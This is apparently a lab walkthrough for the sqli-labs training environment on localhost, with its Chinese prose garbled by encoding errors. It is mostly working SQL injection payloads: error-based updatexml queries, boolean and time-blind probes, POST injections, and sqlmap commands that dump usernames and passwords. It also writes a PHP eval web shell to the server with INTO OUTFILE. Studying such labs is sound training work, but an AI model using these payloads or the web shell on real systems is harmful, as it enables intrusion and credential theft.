<p>æŠ¥é”™æ³¨å…¥ä½¿ç”¨<code>updatexml</code></p>
<p><code>id=1&#39;  and updatexml(1,concat(0x7e,(select concat_ws(&#39;:&#39;,database(),version(),user()))),1)--+</code>==&gt; <code>XPATH syntax error: &#39;~security:5.7.26:root@localhost&#39;</code>å¾—åˆ°æ•°æ®åº“ç­‰ä¿¡æ¯</p>
<p><code>id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39; ),0x7e),1)--+</code>å¾—åˆ°è¡¨å==&gt; <code>XPATH syntax error: &#39;~emails,referers,uagents,users~&#39;</code></p>
<p><code>id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),0x7e),1)--+</code>å¾—åˆ°å­—æ®µå==&gt;<code> XPATH syntax error: &#39;~id,username,password~&#39;</code></p>
<p><code>id=1&#39; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)--+</code>æŸ¥è´¦å·å¯†ç </p>
<br>

<p>SQLmap</p>
<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&quot;</code>  #åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥</p>
<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&quot;  --dbs</code>   #è·å–æ•°æ®åº“ä¿¡æ¯</p>
<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&quot;  -D security --tables</code> #è·å–è¡¨å</p>
<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&quot;  -D security -T users --columns</code>#è·å–å­—æ®µå</p>
<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&quot;  -D security -T users -C username,password --dump</code> #è·å–è´¦å·å¯†ç </p>
<br>

<br>

<h3 id="6-æŠ¥é”™æ³¨å…¥"><a href="#6-æŠ¥é”™æ³¨å…¥" class="headerlink" title="6.æŠ¥é”™æ³¨å…¥"></a>6.æŠ¥é”™æ³¨å…¥</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">	if($<span class="type">row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">  	echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font size=&quot;3&quot;  color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	print_r(mysql_error());</span><br><span class="line">	echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨<code>&quot;</code>é—­åˆ</p>
<p>æ˜¾é”™æ³¨å…¥</p>
<p><code>id=1&quot; --+</code></p>
<p><code>id=1&quot; and 1=1 --+</code></p>
<p><code>id=1&quot; and 1=2 --+</code></p>
<p><code>id=1&quot; and updatexml(1,(concat(0x7e,(select database()),0x7e)),1) --+</code> æŸ¥æ•°æ®åº“å ==&gt;<code>XPATH syntax error: &#39;~security~&#39;</code></p>
<p><code>id=1&quot; and updatexml(1,(concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)),1) --+</code> æŸ¥è¡¨å</p>
<p><code>id=1&quot; and updatexml(1,(concat(0x7e,(select column_name from information_schema.columns where table_schema=database()  and table_name=&#39;users&#39; limit 0,1),0x7e)),1) --+</code> æŸ¥å­—æ®µ</p>
<br>

<h3 id="7-æ–‡ä»¶å†™å…¥"><a href="#7-æ–‡ä»¶å†™å…¥" class="headerlink" title="7.æ–‡ä»¶å†™å…¥"></a>7.æ–‡ä»¶å†™å…¥</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=((&#x27;$id&#x27;)) LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">	if($<span class="type">row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	echo <span class="string">&#x27;You are in.... Use outfile......&#x27;</span>;</span><br><span class="line">  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">  	echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	echo <span class="string">&#x27;You have an error in your SQL syntax&#x27;</span>;</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>print_r(mysql_error());</span><br><span class="line">	echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ ¹æ®æç¤ºè¦æˆ‘ä»¬å†™å…¥æ–‡ä»¶</p>
<p>å†™å…¥ä¸€å¥è¯çš„æ¡ä»¶</p>
<blockquote>
<p>æœ‰æ•°æ®åº“çš„å†™å…¥æƒé™</p>
<p>çŸ¥é“ç½‘ç«™çš„ç»å¯¹è·¯å¾„</p>
<br>
</blockquote>
<p>åœ¨åšå†™å…¥ç»ƒä¹ æ—¶ï¼Œéœ€è¦ç”¨åˆ°<code>into outfile</code> ,ä½†æ‰§è¡Œåå´æ— æ³•ç”Ÿæˆå†™å…¥æ–‡ä»¶</p>
<p>è§£å†³æ–¹æ¡ˆ</p>
<blockquote>
<p>åœ¨MYSQLå‘½ä»¤è¡Œè¾“å…¥ <code>show variables like &#39;%secure%&#39;;</code>æŸ¥çœ‹<code> secure-file-priv</code>çš„å€¼</p>
<p>å‘ç°<code>secure_file_priv</code>å€¼ä¸º<code>NULL</code></p>
<p>åœ¨my.iniä¸­ä¿®æ”¹æˆ–æ·»åŠ <code>secure_file_priv=&quot;/&quot;</code>ç„¶åæŠ¥å­˜å¹¶é‡å¯æ•°æ®åº“ </p>
<p>è¿è¡Œ<code>http://127.0.0.1/sqli-labs/Less-7/?id=-1%27))%20union%20select%201,2,3%20into%20outfile%20%22D:\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\shell.txt%22%20--+</code>æˆåŠŸç”Ÿäº§å†™å…¥æ–‡ä»¶</p>
</blockquote>
<br>

<p>æ ¹æ®ä»£ç è¿›è¡Œé—­åˆ<code>id=1&#39;)) --+</code></p>
<p><code>id=1&#39;)) and (select count(*) from mysql.user)&gt;0--+</code> ä¸æŠ¥é”™è¯´æ˜æ˜¯rootæƒé™</p>
<p>é€šè¿‡å‰é¢çš„å…³å¡å¾—åˆ°å†³å®šè·¯å¾„</p>
<p><code>http://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,@@basedir,@@datadir --+</code>==&gt;</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Your Login name:D:\phpstudy_pro\Extensions\MySQL5.7.26\</span><br><span class="line">Your Password:D:\phpstudy_pro\Extensions\MySQL5.7.26\data\</span><br></pre></td></tr></table></figure>

<br>

<p>?id=-1â€™)) union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) into outfile â€œD:\phpstudy_pro\WWW\sqli-labs\Less-7â€â€“+</p>
<p><code>?id=-1&#39;)) union select 1,2,&#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39; into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\shell.php&quot;--+</code></p>
<p>ä½¿ç”¨èœåˆ€è¿æ¥</p>
<br>

<h3 id="8-å¸ƒå°”ç›²æ³¨"><a href="#8-å¸ƒå°”ç›²æ³¨" class="headerlink" title="8.å¸ƒå°”ç›²æ³¨"></a>8.å¸ƒå°”ç›²æ³¨</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">	if($<span class="type">row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    	echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>print_r(mysql_error());</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>echo &quot;You have an error in your SQL syntax&quot;;</span><br><span class="line">	echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸ç¬¬äº”å…³ç›¸æ¯”,æŠŠéƒ¨åˆ†ä»£ç è¿›è¡Œäº†æ³¨é‡Šï¼Œæ— æ³•ä½¿ç”¨æŠ¥é”™æ³¨å…¥ï¼Œå¯ä»¥è€ƒè™‘å¸ƒå°”ç›²æ³¨æˆ–è€…æ—¶é—´ç›²æ³¨.</p>
<p><code>?id=1&#39; and 1=1 --+</code> æœ‰å›æ˜¾ â€™you are inâ€™</p>
<p><code>?id=1&#39; and 1=2 --+</code>æ— å›æ˜¾</p>
<p>å¯ä»¥åˆ¤æ–­æ˜¯å¸ƒå°”ç›²æ³¨</p>
<ul>
<li>åˆ¤æ–­Mysqlæ•°æ®åº“æ˜¯å¦æ˜¯åœ¨5.0ä»¥ä¸Š</li>
</ul>
<p><code>?id=1&#39; and mid(version(),1,1)=5 --+</code>æœ‰å›æ˜¾  æˆ–</p>
<p><code>?id=1&#39; and left(version(),1)=&#39;5&#39; --+</code>æœ‰å›æ˜¾</p>
<p><code>?id=1&#39; and left(version(),6)=&#39;5.7.26&#39; --+</code> æœ‰å›æ˜¾åˆ¤æ–­å‡ºæ•°æ®åº“ç‰ˆæœ¬ä¸º<code>5.7.26</code></p>
<ul>
<li>åˆ¤æ–­å½“å‰æ•°æ®åº“é•¿åº¦</li>
</ul>
<p><code>?id=1&#39; and length(database())&gt;7 --+</code></p>
<p><code>?id=1&#39; and length(database())=8 --+</code></p>
<ul>
<li>æˆªå–æ•°æ®åº“ç¬¬ä¸€ä½asciiå¹¶åˆ¤æ–­å€¼</li>
</ul>
<p><code>?id=1&#39; and (ord(mid(database(),1,1)))&gt;114 --+</code></p>
<p><code>?id=1&#39; and (ord(mid(database(),1,1)))=115 --+</code></p>
<p>æˆ–è€…</p>
<p><code>?id=1&#39; and left(database(),1)&gt;&#39;n&#39; --+</code></p>
<p><code>?id=1&#39; and left(database(),1)=&#39;s&#39; --+</code></p>
<p><code>?id=1&#39; and left(database(),2)=&#39;se&#39; --+</code></p>
<p><code>?id=1&#39; and left(database(),3)=&#39;sec&#39; --+</code></p>
<p>ä¾æ¬¡å¾—åˆ°åé¢7ä½ ==&gt;æ•°æ®åº“åä¸ºsecurity</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span><span class="keyword">sql</span><span class="operator">-</span>labs<span class="operator">/</span>less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (ord(mid(database(),1,1)))=</span></span><br><span class="line"><span class="string">115 --+</span></span><br><span class="line"><span class="string">http://127.0.0.1/sql-labs/less-8/?id=1&#x27;</span> <span class="keyword">and</span> (ord(mid((<span class="keyword">select</span> </span><br><span class="line">database()) ,<span class="number">2</span>,<span class="number">1</span>))) <span class="operator">=</span> <span class="number">101</span> <span class="comment">--+</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span><span class="keyword">sql</span><span class="operator">-</span>labs<span class="operator">/</span>less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (ord(mid((select </span></span><br><span class="line"><span class="string">database()) ,3,1))) = 99 --+</span></span><br><span class="line"><span class="string">http://127.0.0.1/sql-labs/less-8/?id=1&#x27;</span> <span class="keyword">and</span> (ascii(substr((<span class="keyword">select</span> </span><br><span class="line">database()) ,<span class="number">4</span>,<span class="number">1</span>))) <span class="operator">=</span> <span class="number">117</span> <span class="comment">--+</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span><span class="keyword">sql</span><span class="operator">-</span>labs<span class="operator">/</span>less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (ascii(substr((select database()) ,5,1))) = 114 --+</span></span><br><span class="line"><span class="string">http://127.0.0.1/sql-labs/less-8/?id=1&#x27;</span> <span class="keyword">and</span> (ascii(substr((<span class="keyword">select</span> database()) ,<span class="number">6</span>,<span class="number">1</span>))) <span class="operator">=</span> <span class="number">105</span> <span class="comment">--+</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span><span class="keyword">sql</span><span class="operator">-</span>labs<span class="operator">/</span>less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (ascii(substr((select database()) ,7,1))) = 116 --+</span></span><br><span class="line"><span class="string">http://127.0.0.1/sql-labs/less-8/?id=1&#x27;</span> <span class="keyword">and</span> (ascii(substr((<span class="keyword">select</span> database()) ,<span class="number">8</span>,<span class="number">1</span>))) <span class="operator">=</span> <span class="number">121</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<br>

<p>è·å–æ•°æ®åº“ç¬¬ä¸€å¼ è¡¨çš„é•¿åº¦(æ³¨:è¿™é‡Œlength()é‡Œé¢è¦å†åŠ ä¸€ä¸ªæ‹¬å· )</p>
<p><code>id=1&#39; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;5 --+</code></p>
<p><code>id=1&#39; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6 --+</code></p>
<p>ä¹Ÿå¯ä»¥è¿™æ ·å†™</p>
<p><code>?id=1&#39; and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)&gt;5 --+</code> æœ€ç»ˆå¾—åˆ°é•¿åº¦ä¸º6</p>
<p><code>?id=1&#39; and (select length(table_name) from information_schema.tables where table_schema=database() limit X,1)&gt;5 --+</code> åˆ¤æ–­ç¬¬Xå¼ è¡¨çš„é•¿åº¦</p>
<br>

<ul>
<li>åˆ¤æ–­è¡¨çš„ç¬¬Nä¸ªå­—ç¬¦ æˆªå–ç¬¬Nä½çš„ASCIIç è¿›è¡Œåˆ¤æ–­,åˆ©ç”¨<code>ord()</code> å’Œ <code>mid(***,1,1)</code>æˆ–è€…<code>substr(***,1,1)</code></li>
</ul>
<p><code>?id=1&#39; and ord(mid((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1))=101  --+</code>åˆ¤æ–­securityåº“ä¸­çš„ç¬¬ä¸€ä¸ªè¡¨çš„ç¬¬ä¸€ä¸ªasciiå€¼ä¸º101 å³<code>e</code></p>
<p><code>?id=1&#39; and ord(mid((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),2,1))=109  --+</code> ç¬¬äºŒä½ä½<code>m</code>    ==&gt;æœ€ç»ˆå¾—åˆ°ç¬¬ä¸€å¼ è¡¨åä¸º<code>emails</code></p>
<p>ç¬¬Xå¼ è¡¨çš„ç¬¬Nä½ASCIIç å€¼åˆ¤æ–­</p>
<p><code>?id=1&#39; and ord(mid((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit X-1,1),N,1))=101  --+</code></p>
<p>ä¹Ÿå¯ä»¥åˆ©ç”¨<code>regexp</code>æ³¨å…¥è·å–<code>users</code>è¡¨ä¸­çš„åˆ—</p>
<p><code>http://127.0.0.1/sql/Less-8/?id=1&#39; and 1=(select 1 from information_schema.columns where table_name=&#39;users&#39; and column_name regexp &#39;^us&#39; limit 0,1)--+</code></p>
<br>

<p>ä½¿ç”¨SQLmap</p>
<p><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-8/?id=1 --dbs --technique B --batch</code></p>
<blockquote>
<p>å‚æ•°ï¼šâ€“technique</p>
<p>è¿™ä¸ªå‚æ•°å¯ä»¥æŒ‡å®šsqlmapä½¿ç”¨çš„æ¢æµ‹æŠ€æœ¯ï¼Œé»˜è®¤æƒ…å†µä¸‹ä¼šæµ‹è¯•æ‰€æœ‰çš„æ–¹å¼ã€‚</p>
<p>æ”¯æŒçš„æ¢æµ‹æ–¹å¼å¦‚ä¸‹ï¼š</p>
<p>B: Boolean-based blind SQL injectionï¼ˆå¸ƒå°”å‹æ³¨å…¥ï¼‰<br>E: Error-based SQL injectionï¼ˆæŠ¥é”™å‹æ³¨å…¥ï¼‰<br>U: UNION query SQL injectionï¼ˆå¯è”åˆæŸ¥è¯¢æ³¨å…¥ï¼‰<br>S: Stacked queries SQL injectionï¼ˆå¯å¤šè¯­å¥æŸ¥è¯¢æ³¨å…¥ï¼‰<br>T: Time-based blind SQL injectionï¼ˆåŸºäºæ—¶é—´å»¶è¿Ÿæ³¨å…¥ï¼‰</p>
</blockquote>
<br>

<h3 id="9-æ—¶é—´ç›²æ³¨"><a href="#9-æ—¶é—´ç›²æ³¨" class="headerlink" title="9.æ—¶é—´ç›²æ³¨"></a>9.æ—¶é—´ç›²æ³¨</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">	if($<span class="type">row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    	echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>print_r(mysql_error());</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>echo &quot;You have an error in your SQL syntax&quot;;</span><br><span class="line">	echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>æ— è®ºè¯­å¥æ˜¯å¦æ‰§è¡ŒæˆåŠŸï¼Œéƒ½ä¼šè¿”å›åŒæ ·çš„å›æ˜¾ï¼Œæ‰€ä»¥éœ€è¦é€šè¿‡æ—¶é—´ç›²æ³¨çŒœè§£æ•°æ®</p>
<p><code>?id=1&#39; and sleep(3) --+</code>å°è¯•<code>&#39;```&quot;</code>ç­‰é—­åˆæ–¹å¼ï¼Œæ ¹æ®<code>sleep</code>ç¡®è®¤æ˜¯å¦é—­åˆ</p>
<p><code>?id=1&#39; and if(mid(version(),1,1)=5,sleep(5),1) --+</code>åˆ¤æ–­æ•°æ®åº“ç‰ˆæœ¬</p>
<p><code>?id=1&#39; and if(length(database()=8),sleep(5),1) --+</code>åˆ¤æ–­æ•°æ®åº“é•¿åº¦</p>
<p><code>?id=1&#39; and if(ascii(mid(database(),1,1))=115,sleep(5),1) --+</code> åˆ¤æ–­æ•°æ®åº“å</p>
<p><code>?id=1&#39; and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;3,sleep(5),1) --+</code>åˆ¤æ–­è¡¨é•¿åº¦(length()é‡Œé¢çš„éœ€è¦åŠ <code>()</code>)</p>
<p>ä½¿ç”¨SQLmap</p>
<p><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-9/?id=1 --dbs --technique T --batch</code></p>
<br>

<h3 id="10-æ—¶é—´ç›²æ³¨"><a href="#10-æ—¶é—´ç›²æ³¨" class="headerlink" title="10.æ—¶é—´ç›²æ³¨"></a>10.æ—¶é—´ç›²æ³¨</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">$id <span class="operator">=</span> <span class="string">&#x27;&quot;&#x27;</span>.$id.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">	if($<span class="type">row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    	echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>print_r(mysql_error());</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>echo &quot;You have an error in your SQL syntax&quot;;</span><br><span class="line">	echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>å’Œç¬¬ä¹å…³ä¸€æ ·ï¼Œä¸è¿‡æ˜¯åŒå¼•å·é—­åˆ</p>
<p><code>?id=1&quot; and sleep(5)--+</code></p>
<br>

<h3 id="11-POSTæ³¨å…¥"><a href="#11-POSTæ³¨å…¥" class="headerlink" title="11.POSTæ³¨å…¥"></a>11.POSTæ³¨å…¥</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"> @$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT username, password FROM users WHERE username=&#x27;$uname&#x27; and password=&#x27;$passwd&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);  </span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">if($<span class="type">row</span>)</span><br><span class="line">&#123;</span><br><span class="line"> 		<span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;</span>;	</span><br><span class="line"> 		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">	echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;</span>;</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>echo &quot; You Have successfully logged in\n\n &quot; ;</span><br><span class="line"> ......</span><br></pre></td></tr></table></figure>

<p><code>uname=admin&#39; and 1=1  --  &amp; passwd=admin</code>æˆ–è€…<code>uname=admin&#39; and 1=1 #  &amp; passwd=admin</code> <code>--+</code>ä¼šæŠ¥é”™</p>
<p><code>uname=admin&#39; order by 2  --   &amp; passwd=admin</code>åˆ¤æ–­å­—æ®µæ•°</p>
<p><code>uname=-1&#39; and 1=1 union select 1,2 --    &amp; passwd=admin</code> æ‰¾å›æ˜¾ç‚¹</p>
<p><code>uname=-1&#39; and 1=1 union select @@datadir,version() --    &amp; passwd=admin</code>æŸ¥çœ‹æ•°æ®åº“ç‰ˆæœ¬</p>
<br>

<p>SQLmap</p>
<p><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-11/ --data=&quot;uname=123&amp;passwd=123&amp;submit=Submit&quot; --batch --dbs</code></p>
<h3 id="12-POSTæ³¨å…¥"><a href="#12-POSTæ³¨å…¥" class="headerlink" title="12 POSTæ³¨å…¥"></a>12 POSTæ³¨å…¥</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">@$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p><code>&quot;) #</code>é—­åˆ</p>
<p>SQLmap</p>
<p><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-12/ --data=&quot;uname=123&amp;passwd=123&amp;submit=Submit&quot; --batch --dbs</code></p>
<br>

<h3 id="13-POSTå‹å¸ƒå°”ç›²æ³¨"><a href="#13-POSTå‹å¸ƒå°”ç›²æ³¨" class="headerlink" title="13 POSTå‹å¸ƒå°”ç›²æ³¨"></a>13 POSTå‹å¸ƒå°”ç›²æ³¨</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">@$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT username, password FROM users WHERE username=(&#x27;$uname&#x27;) and password=(&#x27;$passwd&#x27;) LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">	$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">	if($<span class="type">row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  		<span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;</span>;	</span><br><span class="line">  		</span><br><span class="line">  		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;</span>;</span><br><span class="line">		<span class="operator">/</span><span class="operator">/</span>echo &quot; You Have successfully logged in &quot; ;</span><br><span class="line">		echo <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;</span>;	</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		<span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;Your Login name:&#x27;</span>. $<span class="type">row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="operator">/</span><span class="operator">/</span>echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		<span class="operator">/</span><span class="operator">/</span>echo <span 